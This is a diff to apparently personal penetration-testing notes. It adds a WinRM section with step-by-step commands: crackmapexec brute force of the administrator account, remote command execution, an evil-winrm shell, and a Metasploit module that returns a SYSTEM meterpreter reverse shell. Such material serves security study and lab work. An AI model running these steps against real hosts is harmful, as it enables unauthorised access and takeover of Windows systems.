@@ -602,7 +602,7 @@ Hydra will try to actually to connect with any valid credentials using the freer
 
 #### Connect to the Target using XfreeRDP
 
-**xfreerdp** is an open-source client that allows users to connect to a remote desktop server using the Remote Desktop Protocol (RDP). It is part of the FreeRDP project and is commonly used in Linux environments to connect to Windows machines. We need to specify the username `/u:` the password `/p:` , the target `/v:` and its port number:
+**xfreerdp** is an open-source client used for connecting to a remote desktop server using the Remote Desktop Protocol (RDP). It is part of the FreeRDP project and is commonly used in Linux environments to connect to Windows machines. We need to specify the username `/u:` the password `/p:` , the target `/v:` and its port number:
 
 ```
 xfreerdp /u:username /p:password /v:target_ip:rdp_port_number
@@ -697,6 +697,86 @@ In this case, the groomer reserves large blocks of memory in RAM —such as the 
 You can try adjusting the size of memory used if this fails.
 
 After the exploit is done, the meterpreter session should be allowed. This works like EternalBlue where we didn't need to elevate our privileges to get admin access. 
+
+
+## WinRM
+
+WinRM (Windows Remote Management ) is a protocol developed by Microsoft to enable remote access and management of Windows systems over HTTP or HTTPS, simplifying tasks for system administrators. It is commonly used to interact with Windows hosts on a network, execute commands remotely, and manage system configurations. Can login by providing the target IP and then a username with the account password or a password hash. WinRM operates over TCP ports 5985 (HTTP) and 5986 (HTTPS) and incorporates security measures such as access control and authentication.
+
+Tools like _crackmapexec_ can be used to perform brute-force attacks on WinRM to discover user credentials and execute commands on target systems. Additionally, _evil-winrm_, a Ruby script, allows users to establish a command shell session on the target machine.
+
+
+1. **Perform the initial Nmap scan**: Make sure to either scan the entire TCP port range `-p-` or just the 5985/5986 ports. Windows doesn't have a specific banner for WinRM so don't be too concerned with the service name listed for the port.
+
+```
+nmap -sV -p5985,5986 target
+```
+
+
+
+Crackmapexec
+
+The _crackmapexec_ tool can be used for cracking various protocols including winrm.
+- Available protocols: `ssh | winrm | smb | rdp | mssql | ldap | ftp`
+
+General Brute Force Syntax: 
+```
+crackmapexec <protocol> -u <user_or_user_wordlist> -p <password_or_password_list>
+```
+
+Example:
+```
+crackmapexec winrm -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+
+We'd target the administrator account since we'll know its automatically there
+also the administrator is typically used by system administrators here and we wouldn't need to perform privilege escalations later.
+
+If there's a match the brute force will display `(Pwn3d!)` and stop the brute force. Now we can use the credentials to execute commands on the target
+##### Execute Commands
+
+
+We can use the `-x` options which can be used to execute commands on the target like `systeminfo` to collect information:
+
+```
+crackmapexec winrm -u administrator -p pqaeoirgq -x "systeminfo"
+```
+
+### Get a command shell using Evil-WinRM
+
+**Evil-WinRM** is a tool used for post-exploitation, allowing attackers to remotely connect to and execute commands on a Windows system via WinRM. The core script, **evil-winrm.rb**, written in Ruby, automate tasks like remote command execution, file transfers, and script execution on compromised systems. This makes it a go-to tool for penetration testers and red teamers in offensive security scenarios.
+
+- **Link to GitHub:** https://github.com/Hackplayers/evil-winrm
+
+```
+evil-winrm.rb -u administrator -p "pqaeoirgq" -i 10.52.6.4
+```
+- `-u`= Username
+- `-p` = Password
+- `-i` = Target
+
+### Exploitation of WinRM using Metasploit
+
+We can use the winrm_script_exec exploit module (`exploit/windows/winrm/winrm_script_exec`) for exploiting WinRM, you would need to have valid credentials for this to work so enumeration/brute force would be necessary first:
+
+1. **Start Postgresql and the Metasploit Console**
+```
+service postgresql start && msfconsole
+```
+
+2. **Configure the module**: By default the payload will be `windows/meterpreter/reverse_tcp` which is 32-bit and fine here. Need to set the target `RHOSTS` , set the `FORCE_VBS` for the VBS CmdStager to true and then set the `USERNAME`/`PASSWORD`.  The `RPORT` will already be set to 5985 by default.  A **VBS cmdstager** is a the tool will generate and execute commands written in VBScript on a Windows machine to download, write, and execute a payload in stages. This is often used in scenarios where direct execution of a large payload is not feasible, so the payload is staged and executed via small script commands.
+```
+set RHOSTS 10.52.63.52
+set FORCE_VBS true
+set USERNAME administrator
+set PASSWORD wifpoeij
+```
+3. **Run the exploit**:  This try to migrate to a System level process like services.exe, wininit.exe, svchost.exe etc for stability but should eventually migrate successfully and get a meterpreter session as  NT AUTHORITY \SYSTEM.
+```
+exploit
+```
+
+
 
 # Windows-Privilege-Escalation
 
